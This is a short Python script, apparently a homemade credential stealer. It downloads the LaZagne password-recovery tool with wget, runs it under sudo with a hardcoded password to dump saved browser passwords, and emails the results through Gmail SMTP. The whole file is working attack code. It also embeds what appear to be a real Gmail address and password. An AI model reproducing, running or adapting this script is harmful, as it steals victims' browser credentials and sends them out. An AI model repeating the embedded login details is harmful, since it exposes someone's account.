#! /usr/bin/env python
import subprocess
import smtplib
import requests
import sys

def send_mail(email,password,data_output):
    message = "\n"+data_output[0].decode()
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)

def fetch_data_for_windows(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    output_file = open("/home/vickyvirus/Documents/"+file_name,"wb")
    for response in get_response:
        output_file.write(response)

def fetch_data_for_linux():
    sudo_password = "virus1995"
    get_file_command = "wget -r -np -nH --cut-dirs=2 -R malware.py http://localhost/Directory/Linux -P /home/vickyvirus/Lazagne"
    subprocess.call("echo {} | sudo -S {}".format(sudo_password, get_file_command),shell=True)
    data_output = []
    data_output.append(subprocess.check_output("echo {} | sudo -S python3 laZagne.py browsers".format(sudo_password), shell=True,cwd="/home/vickyvirus/Lazagne"))
    if data_output[0] is not None:
        return data_output
    else:
        print("No Data Found")
        sys.exit(0)

# For Linux OS
data_output = fetch_data_for_linux()
email="poojarivicky3@gmail.com"
password = "virus1995"
send_mail(email,password,data_output)

# For Windows OS
# download_for_windows("http://localhost/Directory/")